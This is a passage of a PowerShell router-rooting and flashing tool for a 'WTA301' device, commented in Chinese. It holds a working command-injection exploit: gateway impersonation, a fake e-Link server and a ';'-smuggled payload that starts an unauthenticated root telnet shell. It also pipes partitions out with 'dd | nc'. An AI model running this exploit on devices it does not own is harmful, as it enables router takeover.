        所以起不来是正常情况，不是错误 —— 起不来就直接用 SSH 通道。

        SSH 通道可用的依据：命令走 `< 脚本文件` 而不是行内引号，
        多行脚本、管道、$(...)、重定向全都正常（实测跑通了整段探测脚本）。
        代价是每条命令重建一次连接（约 1 秒），刷机总共二三十条，可以接受。
    #>
    param([string]$DeviceIp, [string]$Password, [int]$Port = 2323)

    $sess = Open-SshSession -Ip $DeviceIp -User 'root' -Password $Password
    $ok = $false
    try {
        $chk = Invoke-SshRaw -Sess $sess -Script 'busybox 2>&1 | tr "," "\n" | grep -cx telnetd || true' -TimeoutSec 30
        if ($chk -match '^\s*1\s*$') {
            Write-Info "   设备有 telnetd，拉起来以复用 telnet 通道"
            $sc = "( /bin/busybox telnetd -l /bin/sh -p __P__ >/dev/null 2>&1 & ) ; sleep 1 ; echo STARTED"
            $sc = $sc -replace '__P__', $Port
            [void](Invoke-SshRaw -Sess $sess -Script $sc -TimeoutSec 40)
            $deadline = [Environment]::TickCount + 8000
            while ([Environment]::TickCount -lt $deadline) {
                if (Test-PortOpen -Ip $DeviceIp -TcpPort $Port -TimeoutMs 700) { $ok = $true; break }
                Start-Sleep -Milliseconds 350
            }
        } else {
            Write-Info "   设备没有 telnetd applet（busybox 精简过）"
        }
    } finally {
        Close-SshSession -Sess $sess
    }

    if ($ok) {
        Write-Ok ("   通道: telnet {0}:{1}" -f $DeviceIp, $Port)
        return @{ Mode = 'telnet'; Port = $Port }
    }
    Write-Ok "   通道: SSH（每条命令一次连接；命令走 stdin，不受引号影响）"
    return @{ Mode = 'ssh' }
}

function Close-SshSession {
    param($Sess)
    if (-not $Sess) { return }
    if ($Sess.Ask) {
        $d = Split-Path $Sess.Ask -Parent
        Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Invoke-SshPipe {
    <#
        SSH 通道直接搬字节，不经过 HTTP。

        PC -> 设备：ssh root@ip "cat > /tmp/x"  < 本地文件
        设备 -> PC：ssh root@ip "cat /dev/mtd5"  > 本地文件

        为什么不用 wget/HTTP：
          实测在 OpenWrt 上走的 wget 其实是 uclient-fetch，连工具自己的 HTTP 服务
          报 `Failed to send request: Operation not permitted`（EPERM），得 0 字节；
          而同一个 SSH 通道刚才还在正常跑命令。
          既然本来就要 SSH，就别再开第二条 HTTP 路 —— 少一个端口、少一层防火墙、
          少一个 wget 变体差异，也省掉「上传后还要比 md5」的往返。

        坑（和 Invoke-SshRaw 同源，改了会坏）：
          · 必须 `< 文件` / `> 文件` 真重定向，不能用管道喂 stdin
          · stdin 被 SSH 占用后，密码只能走 SSH_ASKPASS
    #>
    param($Sess, [string]$RemoteCmd, [string]$StdinPath, [string]$StdoutPath,
          [int]$TimeoutSec = 1800)

    $id  = [guid]::NewGuid().ToString('N').Substring(0, 8)
    $baF = Join-Path $env:TEMP "wta301p_$id.bat"
    $erF = Join-Path $env:TEMP "wta301p_$id.err"

    $remote = ("{0}@{1}" -f $Sess.User, $Sess.Ip)
    $in  = if ($StdinPath)  { ' < "' + $StdinPath  + '"' } else { '' }
    $out = if ($StdoutPath) { ' > "' + $StdoutPath + '"' } else { ' > NUL' }

    $bat = @(
        '@echo off'
        ('set "SSH_ASKPASS=' + $Sess.Ask + '"')
        'set "SSH_ASKPASS_REQUIRE=force"'
        'set "DISPLAY=localhost:0"'
        ('"' + $Sess.SshExe + '" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL ' +
         '-o LogLevel=ERROR -o PubkeyAuthentication=no ' +
         '-o PreferredAuthentications=password,keyboard-interactive ' +
         '-o NumberOfPasswordPrompts=1 -o ConnectTimeout=10 ' +
         $remote + ' ' + $RemoteCmd + $in + $out + ' 2> "' + $erF + '"')
        'exit /b %ERRORLEVEL%'
    )
    [IO.File]::WriteAllLines($baF, $bat, (New-Object Text.UTF8Encoding $false))

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName  = (Join-Path $env:SystemRoot 'System32\cmd.exe')
        $psi.Arguments = ('/c "' + $baF + '"')
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $p = [System.Diagnostics.Process]::Start($psi)
        if (-not $p.WaitForExit($TimeoutSec * 1000)) {
            try { $p.Kill() } catch { }
            throw ("SSH 传输超时（{0}s）：{1}" -f $TimeoutSec, $RemoteCmd)
        }
        if ($p.ExitCode -ne 0) {
            $e = if (Test-Path -LiteralPath $erF) { (Get-Content -LiteralPath $erF -Raw) } else { '' }
            throw ("SSH 传输失败（exit {0}）：{1}  {2}" -f $p.ExitCode, $RemoteCmd, $e.Trim())
        }
    } finally {
        Remove-Item -LiteralPath $baF -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $erF -Force -ErrorAction SilentlyContinue
    }
}

function Connect-Device {
    param([string]$Ip, [int]$TcpPort = 2323, [int]$TimeoutMs = 6000)
    $c = [System.Net.Sockets.TcpClient]::new()
    $iar = $c.BeginConnect($Ip, $TcpPort, $null, $null)
    if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs)) {
        $c.Close(); throw "连接 $Ip`:$TcpPort 超时"
    }
    $c.EndConnect($iar)
    $s = $c.GetStream()
    $s.ReadTimeout  = 60000
    $s.WriteTimeout = 20000
    return @{ Client = $c; Stream = $s; Ip = $Ip; Port = $TcpPort }
}

function Close-Device {
    param($Sess)
    if (-not $Sess) { return }
    if ($Sess.Kind -eq 'ssh') { Close-SshSession -Sess $Sess; return }
    try { $Sess.Stream.Close() } catch { }
    try { $Sess.Client.Close() } catch { }
}

function Send-Raw {
    param($Sess, [string]$Text)
    $b = [Text.Encoding]::UTF8.GetBytes($Text + "`n")
    $Sess.Stream.Write($b, 0, $b.Length)
    $Sess.Stream.Flush()
}

# 读一会儿，返回已经收到的字节
function Send-Background {
    <#
        在设备上起一个不等的后台任务（备份的 dd|nc、reboot 都走这里）。
        telnet：直接写进 socket，后面不读它就行。
        SSH：启动一个不等待的子进程（ssh 读完 stdin 脚本就退出，
             但里面用 & 起的 nc/dd 是设备侧后台，不受影响）。
        返回值对调用方无意义，失败才抛。
    #>
    param($Sess, [string]$Text)

    if ($Sess.Kind -eq 'ssh') {
        $id = [guid]::NewGuid().ToString('N').Substring(0, 8)
        $shF = Join-Path $env:TEMP "wta301_$id.sh"
        $baF = Join-Path $env:TEMP "wta301_$id.bat"
        $body = (($Text -replace "`r`n", "`n") -replace "`r", "`n") + "`n"
        [IO.File]::WriteAllText($shF, $body, (New-Object Text.UTF8Encoding $false))
        $remote = ("{0}@{1}" -f $Sess.User, $Sess.Ip)
        $bat = @(
            '@echo off'
            ('set "SSH_ASKPASS=' + $Sess.Ask + '"')
            'set "SSH_ASKPASS_REQUIRE=force"'
            'set "DISPLAY=localhost:0"'
            ('"' + $Sess.SshExe + '" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL ' +
             '-o LogLevel=ERROR -o PubkeyAuthentication=no ' +
             '-o PreferredAuthentications=password,keyboard-interactive ' +
             '-o NumberOfPasswordPrompts=1 -o ConnectTimeout=10 ' +
             $remote + ' sh -s < "' + $shF + '" > NUL 2> NUL')
        )
        [IO.File]::WriteAllLines($baF, $bat, (New-Object Text.UTF8Encoding $false))
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = (Join-Path $env:SystemRoot 'System32\cmd.exe')
        $psi.Arguments = ('/c "' + $baF + '"')
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        [void][System.Diagnostics.Process]::Start($psi)   # 不等
        return
    }
    Send-Raw -Sess $Sess -Text $Text
}

function Read-For {
    param($Sess, [int]$Milliseconds)
    $buf = New-Object System.IO.MemoryStream
    $tmp = New-Object byte[] 65536
    $deadline = [Environment]::TickCount + $Milliseconds
    while ([Environment]::TickCount -lt $deadline) {
        if (-not $Sess.Stream.DataAvailable) { Start-Sleep -Milliseconds 20; continue }
        try { $n = $Sess.Stream.Read($tmp, 0, $tmp.Length) } catch { break }
        if ($n -le 0) { break }
        $buf.Write($tmp, 0, $n)
    }
    return $buf.ToArray()
}

# 把上一轮的残留读干净，避免更早的哨兵串进来
function Clear-Pending {
    param($Sess, [int]$BudgetMs = 150)
    $deadline = [Environment]::TickCount + $BudgetMs
    while ([Environment]::TickCount -lt $deadline) {
        if ($Sess.Stream.DataAvailable) {
            try { [void]$Sess.Stream.Read((New-Object byte[] 65536), 0, 65536) } catch { }
        } else { Start-Sleep -Milliseconds 10 }
    }
}

<#
    发一条命令，等它真的结束才返回。
    这是整个工具提速的关键：原来每个慢命令都固定等 30 秒，
    而板上命令 1~2 秒就返回了。实测 12 MiB 分区的 md5：
    固定等待 32.01s  ->  哨兵轮询 1.35s。
#>
function Invoke-Cmd {
    param($Sess, [string]$Command, [int]$TimeoutSec = 300)

    # SSH 会话不该走到这里：OpenWrt 路径只做一次 SSH 拉 telnetd，
    # 之后统一用 telnet（不需要密码、也就不用受 Windows ssh.exe 的气）。
    if ($Sess.Kind -eq 'ssh') {
        return Invoke-SshRaw -Sess $Sess -Script $Command -TimeoutSec $TimeoutSec
    }

    $tag = "QZ{0:x8}ZQ" -f (Get-Random -Minimum 1 -Maximum 2147483647)
    Clear-Pending -Sess $Sess
    $payload = "{ $Command ; } 2>&1; echo $tag" + '$?'
    Send-Raw -Sess $Sess -Text $payload

    $rx   = [regex]::Escape($tag) + '[0-9]'
    $buf  = New-Object System.IO.MemoryStream
    $tmp  = New-Object byte[] 65536
    $deadline = [Environment]::TickCount + ($TimeoutSec * 1000)
    $text = ""
    while ([Environment]::TickCount -lt $deadline) {
        if (-not $Sess.Stream.DataAvailable) { Start-Sleep -Milliseconds 40; continue }
        try { $n = $Sess.Stream.Read($tmp, 0, $tmp.Length) } catch { break }
        if ($n -le 0) { break }
        $buf.Write($tmp, 0, $n)
        $text = [Text.Encoding]::UTF8.GetString($buf.ToArray())
        if ([regex]::IsMatch($text, '(?:^|[\r\n])' + $rx)) { break }
    }
    if (-not $text) { $text = [Text.Encoding]::UTF8.GetString($buf.ToArray()) }
    $text = $text -replace "`r", ""

    # 去掉回显行和哨兵行。判据用「整行等于 payload」——
    # 用「以 { 开头删到 }」会在长命令上一路删到缓冲区末尾，把真输出删光。
    $out = New-Object System.Collections.Generic.List[string]
    foreach ($l in $text -split "`n") {
        if ($l -like "*$tag*") { continue }
        if ($l -eq $payload) { continue }
        if ($l.Length -gt 8 -and $payload.StartsWith($l)) { continue }
        [void]$out.Add($l)
    }
    return ($out -join "`n").Trim()
}

function Get-FirstMd5 {
    param([string]$Text)
    $m = [regex]::Match($Text, '\b([0-9a-f]{32})\b')
    if ($m.Success) { return $m.Groups[1].Value }
    return ""
}

function Get-LocalMd5 {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return "" }
    # 不用 Get-FileHash：某些机器上 Microsoft.PowerShell.Utility 没能自动加载，
    # 会报「无法识别 Get-FileHash」。直接用 .NET 算，零依赖。
    $fs = $null
    try {
        $md5 = [System.Security.Cryptography.MD5]::Create()
        $fs  = [System.IO.File]::OpenRead((Resolve-Path -LiteralPath $Path).ProviderPath)
        $h   = $md5.ComputeHash($fs)
        return (($h | ForEach-Object { $_.ToString('x2') }) -join '')
    } finally {
        if ($fs) { $fs.Close() }
    }
}

# ===========================================================================
# 设备分区表 —— 唯一真源是 /sys/class/mtd/mtdN/offset
#   为什么不能用编号或名字：原厂和我们的 OpenWrt 对同一块区域命名互为主备，
#   同一个 mtdN 在两个固件下指向完全不同的物理位置。
#   所以一律「按绝对偏移反查编号」，反查不到就中止。
# ===========================================================================
function Get-MtdTable {
    param($Sess)
    # 注意：不要用 glob /sys/class/mtd/mtd*。
    # 那个目录里除了 mtd0..mtd13 还有 mtd0ro..mtd13ro（字符设备），
    # glob 会把它们一起吃进来，读 mtdNro 会卡住（实测挂 30s 超时）。
    # 用显式编号 + [ -d ] 判断，绕开所有 ro 设备。
    $cmd = 'for i in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19; do ' +
           'p=/sys/class/mtd/mtd$i; ' +
           '[ -d $p ] && echo "mtd$i $(cat $p/offset) $(cat $p/size) $(cat $p/name 2>/dev/null)"; ' +
           'done; true'
    $raw = Invoke-Cmd -Sess $Sess -Command $cmd -TimeoutSec 60
    $tbl = @{}
    foreach ($line in ($raw -split "`n")) {
        $t = $line.Trim()
        if ($t -notmatch '^mtd(\d+)\s+(\d+)\s+(\d+)\s*(.*)$') { continue }
        $idx = [int]$Matches[1]
        $tbl[$idx] = @{
            Index  = $idx
            Offset = [int64]$Matches[2]
            Size   = [int64]$Matches[3]
            Name   = if ($Matches[4]) { $Matches[4].Trim() } else { "mtd$idx" }
        }
    }
    if ($tbl.Count -eq 0) { throw "读不到分区表（/sys/class/mtd 为空？）" }
    return $tbl
}

# 按物理绝对偏移找当前固件下的 mtd 编号
function Find-MtdByOffset {
    param($Table, [int64]$Offset)
    foreach ($k in $Table.Keys) {
        if ($Table[$k].Offset -eq $Offset) { return $Table[$k] }
    }
    return $null
}

function Format-Hex { param([int64]$V) return ("0x{0:x}" -f $V) }

function Get-DeviceFacts {
    param($Sess, $Table)
    $ver = ""
    $o = Invoke-Cmd -Sess $Sess -Command "uname -r" -TimeoutSec 15
    foreach ($l in ($o -split "`n")) {
        $t = $l.Trim()
        if ($t -and $t -match '\d') { $ver = $t; break }
    }
    $kind = $null
    if ($ver -match '^4\.4\.') { $kind = 'stock' }
    elseif ($ver -match '^6\.')  { $kind = 'openwrt' }
    return @{ Kernel = $ver; Kind = $kind }
}

# 当前运行中 rootfs 的物理绝对偏移（判活分区用）
function Get-LiveRootOffset {
    param($Sess, $Table)
    $o = Invoke-Cmd -Sess $Sess -Command "cat /proc/cmdline" -TimeoutSec 15
    $m = [regex]::Match($o, 'root=/dev/mtdblock(\d+)')
    if (-not $m.Success) { return $null }
    $idx = [int]$m.Groups[1].Value
    if ($Table.ContainsKey($idx)) { return $Table[$idx].Offset }
    return $null
}

# ===========================================================================
# 写入门禁 —— 不是返回值，是抛异常。--yes 也绕不过 HardDeny。
# ===========================================================================
function Test-WriteAllowed {
    param([int64]$AbsOffset, [string]$Action)
    $key = Format-Hex $AbsOffset
    if ($script:HardDeny.ContainsKey($key)) {
        throw ("拒绝写入 {0}（{1}）。这是硬禁止区域，任何参数都绕不过。" -f `
               $key, $script:HardDeny[$key])
    }
    if ($script:Guarded.ContainsKey($key)) {
        $allow = $script:Guarded[$key]
        if ($allow -notcontains $Action) {
            throw ("拒绝：{0} 只允许 [{1}] 写，当前动作是 [{2}]。" -f `
                   $key, ($allow -join ','), $Action)
        }
    }
    return $true
}

# 检查目标区间不撞 overlay、不撞活分区
function Test-WriteSpan {
    param($Table, [int64]$Abs, [int64]$Len, [string]$What)
    # overlay 保护区：mtd7/mtd12 是同一块 0x6A00000..0x8000000
    foreach ($ov in @(@{S=0x6A00000; E=0x8000000; N='原厂 overlay (mtd7/mtd12)'},
                      @{S=0x1BC0000; E=0x4000000; N='OpenWrt overlay (mtd12/wta301data)'})) {
        if ($Abs -lt $ov.E -and ($Abs + $Len) -gt $ov.S) {
            throw ("{0} 的写入区间 {1}..{2} 与 {3} 重叠，中止。" -f `
                   $What, (Format-Hex $Abs), (Format-Hex ($Abs + $Len)), $ov.N)
        }
    }
    return $true
}

# ===========================================================================
# getroot —— 整个工具的核心
#
# 原理（已实证，不是推测）：
#   设备上的 elinkclt 会主动反连「网关地址:32768」。
#   我们把那个地址加成自己的 /32 别名，设备的回连就打到这里。
#   握手：keyngreq -> dh(2048-bit) -> dev_reg
#   注册完我们下发 ubus_call ctcapd.appd install {"url": "http://<PC>:8099/x;(<cmd>);"}
#   appd 把 url 拼进 wget 再 popen，没有过滤 ';' —— 于是 <cmd> 被执行。
#   <cmd> = telnetd -l /bin/sh -p 2323，之后 uid=0(root)。
#
# 三个曾经的误区，现在都推翻了：
#   · 不需要中继/repeater 模式，路由模式也行
#   · 不需要连设备 WiFi，有线 LAN1 也行
#   · 不需要 scapy / ARP 毒化（用户明确禁止用 scapy，会把网络搞坏）
# ===========================================================================
function Test-PortOpen {
    param([string]$Ip, [int]$TcpPort, [int]$TimeoutMs = 800)
    $c = [System.Net.Sockets.TcpClient]::new()
    try {
        $iar = $c.BeginConnect($Ip, $TcpPort, $null, $null)
        if ($iar.AsyncWaitHandle.WaitOne($TimeoutMs)) { $c.EndConnect($iar); return $true }
        return $false
    } catch { return $false } finally { try { $c.Close() } catch { } }
}

function Invoke-GetRoot {
    param([string]$DeviceIp, [string]$PcAddr, [switch]$Persist)

    $sw = [Diagnostics.Stopwatch]::StartNew()
    $gwA = ($DeviceIp -split '\.')[0..2] -join '.'
    $aliases = @("$gwA.1", "192.168.0.1")

    $ifIdx = Get-IfIndexOfIp -Ip $PcAddr
    if ($ifIdx -eq 0) {
        $ifIdx = (Get-NetIPAddress -IPAddress $PcAddr -ErrorAction SilentlyContinue).InterfaceIndex
    }
    Write-Info "网卡 InterfaceIndex=$ifIdx（持有 $PcAddr）"

    Write-Step "[1] 冒充网关"
    # 注意：函数只返回「本次新增的」，但清理时要清【全部候选】——
    # 上一次异常退出可能留下了别名，那也是本工具加的假网关，必须一起收拾。
    $addedAlias = Add-GatewayAlias -IfIndex $ifIdx -Addrs $aliases
    # 32768 是 e-Link 回连口，8099 是设备 wget 取包的口，
    # 8100-8103 是备份并行流。注意它们【不连续】，不能写成一段。
    Enable-FirewallPort -Spec ("{0},{1},{2}-{3}" -f `
        $script:ELINK_PORT, $script:SRV_PORT, $script:NC_PORT, $script:NC_PORT_END)

    $payload = "http://{0}:{1}/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);" -f `
               $PcAddr, $script:SRV_PORT

    Write-Step "[2] 起 HTTP 服务 + e-Link 模拟器（同进程）"
    $http = Start-HttpServer -ListenPort $script:SRV_PORT -Root $script:Here
    $elink = Start-ElinkServer -ListenPort $script:ELINK_PORT `
                               -UbusObject 'ctcapd.appd' -UbusMethod 'install' `
                               -UbusMessage (@{ url = $payload } | ConvertTo-Json -Compress)
    Write-Info "+ payload: $payload"

    Write-Step "[3] 等设备自己回连（周期是秒级，别碰它）"
    $deadline = [Environment]::TickCount + 120000
    while ([Environment]::TickCount -lt $deadline) {
        if (Test-PortOpen -Ip $DeviceIp -TcpPort 2323 -TimeoutMs 600) {
            Write-Ok ("*** 2323 OPEN  t={0:N0}s ***" -f $sw.Elapsed.TotalSeconds)
            break
        }
        Start-Sleep -Milliseconds 400
    }
    if (-not (Test-PortOpen -Ip $DeviceIp -TcpPort 2323 -TimeoutMs 1000)) {
        Stop-BackgroundService -State $http  -Name 'HTTP'
        Stop-BackgroundService -State $elink -Name 'e-Link'
        Remove-GatewayAlias -IfIndex $ifIdx -Addrs $addedAlias
        Disable-FirewallPort
        throw "120 秒内设备没有回连。检查：网线是否插 LAN1、设备 IP 是否为 $DeviceIp、防火墙是否放行 32768。"
    }

    Write-Step "[4] 连上 root shell"
    $sess = Connect-Device -Ip $DeviceIp -TcpPort 2323 -TimeoutMs 8000
    $id = Invoke-Cmd -Sess $sess -Command "id" -TimeoutSec 15
    Write-Info $id.Replace("`n", " ")

    # 只返回数据，清理逻辑放函数里（见上面 Stop-BackgroundService 的注释）
    return @{ Sess = $sess; Http = $http; Elink = $elink
              IfIndex = $ifIdx; Aliases = $aliases; NewAliases = $addedAlias }
}

# ===========================================================================
# 整片备份 —— 4 路并行
#
# 为什么并行：板上实测「从 NAND 读出 12 MiB 并算 md5」只要 1.35 秒（≈8.9 MB/s），
# 但同样的数据走 `dd | nc` 单流只有 ≈0.65 MB/s。100 Mbps 网线也有 12.5 MB/s。
# 所以瓶颈是单条 TCP 流上的往返延迟，不是带宽 —— 加带宽没用，多开几条才行。
# ===========================================================================
function Start-NcSink {
    param([int]$ListenPort, [string]$Path, [int]$TimeoutSec = 180)
    $sb = {
        param($port, $path, $timeoutSec)
        $l = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
        $l.Server.SetSocketOption('Socket', 'ReuseAddress', $true)
        try { $l.Start() } catch { return -1 }
        $l.Server.ReceiveTimeout = $timeoutSec * 1000
        $c = $null
        try {
            $iar = $l.BeginAcceptTcpClient($null, $null)
            if (-not $iar.AsyncWaitHandle.WaitOne($timeoutSec * 1000)) { return -1 }
            $c = $l.EndAcceptTcpClient($iar)
        } catch { return -1 } finally { try { $l.Stop() } catch { } }
        $n = 0
        try {
            $s = $c.GetStream()
            $s.ReadTimeout = 60000
            $fs = [System.IO.File]::Create($path)
            $buf = New-Object byte[] 1048576
            try {
                while ($true) {
                    $r = $s.Read($buf, 0, $buf.Length)
                    if ($r -le 0) { break }
                    $fs.Write($buf, 0, $r)
                    $n += $r
                }
            } finally { $fs.Close(); $s.Close() }
        } catch { } finally { try { $c.Close() } catch { } }
        return $n
    }
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($sb.ToString()).AddArgument($ListenPort).AddArgument($Path).AddArgument($TimeoutSec)
    return @{ PS = $ps; Handle = $ps.BeginInvoke(); Port = $ListenPort; Path = $Path }
}

function Invoke-Backup {
    param($Sess, $Table, [string]$PcIp, [string]$OutDir)
    # 空目录会一路传到 Get-FileHash/Send-FileToDevice，最后报
    # 「无法将参数绑定到参数"LiteralPath"，因为该参数为空字符串」——
    # 报错点离根因十万八千里。在这里拦死。
    if ([string]::IsNullOrWhiteSpace($OutDir)) { throw "备份目录为空（内部错误：调用方没有给 -OutDir）" }
    if (-not (Test-Path -LiteralPath $OutDir)) { [void](New-Item -ItemType Directory -Path $OutDir -Force) }

    $plan = @()
    foreach ($k in ($Table.Keys | Sort-Object)) {
        if ($script:BackupSkip -contains $k) { continue }
        $it  = $Table[$k]
        $nm  = $it.Name -replace '[^A-Za-z0-9_.-]', '_'
        $plan += @{ Index = $k; Name = $it.Name; Size = $it.Size
                    File = "mtd$k`_$nm.bin"
                    Path = (Join-Path $OutDir "mtd$k`_$nm.bin") }
    }

    Write-Step "[B1] 备份到 $OutDir"
    Write-Info "PC 侧监听 TCP $($script:NC_PORT)-$($script:NC_PORT_END)（$($script:NC_PARALLEL) 路并行）"
    Write-Info "设备侧 dd | nc；单流被往返延迟卡住，多开几条才快"

    $manifest = @()
    $allOk = $true
    for ($b0 = 0; $b0 -lt $plan.Count; $b0 += $script:NC_PARALLEL) {
        $batch = @($plan[$b0..([Math]::Min($b0 + $script:NC_PARALLEL - 1, $plan.Count - 1))])
        Write-Info ""
        $sinks = @()
        for ($k = 0; $k -lt $batch.Count; $k++) {
            $it = $batch[$k]
            Write-Info ("   mtd{0,-2} {1,-20} {2}  -> TCP {3}" -f `
                        $it.Index, $it.Name, (Format-Hex $it.Size), ($script:NC_PORT + $k))
            $sinks += Start-NcSink -ListenPort ($script:NC_PORT + $k) -Path $it.Path `
                                   -TimeoutSec ([int]([Math]::Max(60, $it.Size / 1048576 * 3)))
        }
        # 设备侧一次性全发起来（& 后台）。telnet 只下命令，不参与搬数据。
        for ($k = 0; $k -lt $batch.Count; $k++) {
            Send-Background -Sess $Sess -Text ("(dd if=/dev/mtdblock{0} bs=65536 2>/dev/null | nc {1} {2}) &" -f `
                                            $batch[$k].Index, $PcIp, ($script:NC_PORT + $k))
        }
        Start-Sleep -Milliseconds 300

        for ($k = 0; $k -lt $batch.Count; $k++) {
            $it = $batch[$k]
            $got = -1
            try { $res = $sinks[$k].PS.EndInvoke($sinks[$k].Handle); if ($res.Count) { $got = [int]$res[$res.Count-1] } }
            catch { $got = -1 }
            $sinks[$k].PS.Dispose()

            $local = Get-LocalMd5 -Path $it.Path
            if ($got -eq $it.Size) {
                Write-Ok ("mtd{0,-2} OK {1}  md5={2}" -f $it.Index, (Format-Hex $got), $local)
                $manifest += @{ Index=$it.Index; Name=$it.Name; Size=$it.Size; Md5=$local; File=$it.File }
            } elseif ($got -le 0) {
                Write-Err2 ("mtd{0,-2} 设备没有连过来" -f $it.Index); $allOk = $false
            } else {
                Write-Warn2 ("mtd{0,-2} PARTIAL {1} / {2}（设备返回 EOF，多为尾部擦除态）" -f `
                             $it.Index, (Format-Hex $got), (Format-Hex $it.Size))
                # 只在短读时补读一次做前缀核对（正常情况不读第二遍）
                $devHead = Get-FirstMd5 (Invoke-Cmd -Sess $Sess -TimeoutSec 180 -Command `
                    ("dd if=/dev/mtdblock{0} bs=65536 count={1} 2>/dev/null | md5sum" -f `
                     $it.Index, [int]($got / 65536)))
                if ($devHead -and $devHead -eq $local) {
                    Write-Info "   前 $(Format-Hex $got) 字节 md5 与设备一致 -> 缺的只是尾部"
                    $manifest += @{ Index=$it.Index; Name=$it.Name; Size=$got; Md5=$local
                                    File=($it.File + ' (PARTIAL)') }
                } else { $allOk = $false }
            }
        }
    }

    $mf = Join-Path $OutDir 'MD5SUMS.txt'
    $lines = @('# WTA301 分区备份清单', '# md5  大小  分区号  分区名  文件名')
    foreach ($m in $manifest) {
        $lines += ("{0}  {1,10}  mtd{2,-2}  {3,-20}  {4}" -f $m.Md5, $m.Size, $m.Index, $m.Name, $m.File)
    }
    $lines | Set-Content -LiteralPath $mf -Encoding UTF8
    Write-Info ""
    Write-Info "[B2] 清单: $mf（$($manifest.Count) 个分区）"
    if (-not $allOk) { Write-Warn2 "有分区未完整备份，别当完整备份用" }
    return $allOk
}

# ===========================================================================
# 刷机
#
# ★★★ 落点全部按【绝对偏移】反查，不按 mtd 编号 ★★★
#   实测证据（flash_full_128M.bin 里按偏移 dd 出来的 md5）：
#     0x880000  2868d8e9...  ← 文件名却叫 mtd10_kernel_bak.bin
#     0x4880000 170b2188...  ← 文件名却叫 mtd5_kernel.bin
#   文件名是本机在【某个固件下】dd 出来的编号，跨固件对不上，甚至会反。
#   所以这里一律：目标绝对偏移 -> Find-MtdByOffset -> 当前固件下的编号。
# ===========================================================================
$script:SlotA = @{ Kernel = 0x4880000; Rootfs = 0x4FC0000 }
$script:SlotB = @{ Kernel = 0x0880000; Rootfs = 0x0FC0000 }
$script:UbootA = 0x4700000
$script:UbootB = 0x0700000

function Resolve-WriteTarget {
    param($Table, [int64]$AbsOffset, [int64]$NeedLen, [string]$What, [string]$Action, [int64]$Bs = 65536)

    # 同一段物理区域可能被两个分区同时覆盖 —— 这是实测存在的：
    #   0x4880000 既是 mtd10 kernel（4 MiB，直写够 4.4.60 的内核）
    #   又是 mtd13 容器 firmware_bak（0x2620000，+0x80000 起是内核区）
    # OpenWrt 的 FIT 实占 0x41526c（4.28 MiB）> mtd10 的 4 MiB，
    # 直写 mtd10 会被截断成砖。所以必须挑「能装下的那个」，并带上 seek。
    $cands = @($Table.Values | Where-Object {
        $_.Offset -le $AbsOffset -and ($_.Offset + $_.Size) -ge ($AbsOffset + $NeedLen)
    })
    if ($cands.Count -eq 0) {
        $any = Find-MtdByOffset -Table $Table -Offset $AbsOffset
        if ($any) {
            throw ("{0}：要写 {1} 字节，但从 {2} 起没有一个分区装得下（mtd{3} 只有 {4}）。中止。" -f `
                   $What, (Format-Hex $NeedLen), (Format-Hex $AbsOffset), $any.Index, (Format-Hex $any.Size))
        }
        throw ("找不到覆盖绝对偏移 {0} 的分区（{1}）。分区表与预期不符，中止。" -f `
               (Format-Hex $AbsOffset), $What)
    }

    # 优先「起点正好对上」的；否则选最小的能装下的（避免无谓写大容器）
    $exact = @($cands | Where-Object { $_.Offset -eq $AbsOffset })
    $pick  = if ($exact.Count) { $exact | Sort-Object Size | Select-Object -First 1 }
             else { $cands | Sort-Object Size | Select-Object -First 1 }

    # 用写入起点 $AbsOffset，不是 $pick.Offset —— mtd13 容器的落点是 +0x80000
    [void](Test-WriteAllowed -AbsOffset $AbsOffset -Action $Action)
    [void](Test-WriteSpan -Table $Table -Abs $AbsOffset -Len $NeedLen -What $What)

    $delta = $AbsOffset - $pick.Offset
    if ($delta % $Bs -ne 0) {
        throw ("{0}：落点与分区起点相差 {1} 字节，不是 {2} 的整数倍，无法用 dd seek 定位。中止。" -f `
               $What, $delta, $Bs)
    }
    $pick.SeekBlocks = [int64]($delta / $Bs)
    return $pick
}

# 设备侧下载一个本地文件，返回设备上的路径
function Get-RangeMd5 {
    # 取文件某一段的 md5（不整文件读入内存，17MB 包也没问题）
    param([string]$Path, [int64]$Offset, [int64]$Length)
    $fs = [IO.File]::OpenRead($Path)
    try {
        [void]$fs.Seek($Offset, 'Begin')
        $md5 = [System.Security.Cryptography.MD5]::Create()
        $buf = New-Object byte[] 1048576
        $left = $Length
        while ($left -gt 0) {
            $want = [int][Math]::Min($buf.Length, $left)
            $n = $fs.Read($buf, 0, $want)
            if ($n -le 0) { break }
            [void]$md5.TransformBlock($buf, 0, $n, $null, 0)
            $left -= $n
        }
        [void]$md5.TransformFinalBlock((New-Object byte[] 0), 0, 0)
        return (($md5.Hash | ForEach-Object { $_.ToString('x2') }) -join '')
    } finally { $fs.Close() }
}

function Get-RelUrlPath {
    # HTTP 服务的根是 kit 目录，文件在 images 或 uboot 等子目录里。
    # 所以 URL 必须带上相对路径，只发文件名会 404。
    param([string]$LocalPath)
    $root = [IO.Path]::GetFullPath($script:Here)
    $full = [IO.Path]::GetFullPath($LocalPath)
    if (-not $root.EndsWith('\')) { $root += '\' }
    if ($full.StartsWith($root, 'OrdinalIgnoreCase')) {
        $rel = $full.Substring($root.Length)
    } else {
        # 文件不在 kit 目录里（用户自己指定了别处的包）：
        # 拷一份到 kit 目录下，服务才取得到。
        $name = Split-Path $full -Leaf
        $copy = Join-Path $root $name
        if (-not (Test-Path -LiteralPath $copy) -or
            (Get-LocalMd5 $copy) -ne (Get-LocalMd5 $full)) {
            Copy-Item -LiteralPath $full -Destination $copy -Force
        }
        $rel = $name
    }
    return (($rel -split '[\\/]') | ForEach-Object { [uri]::EscapeDataString($_) }) -join '/'
}

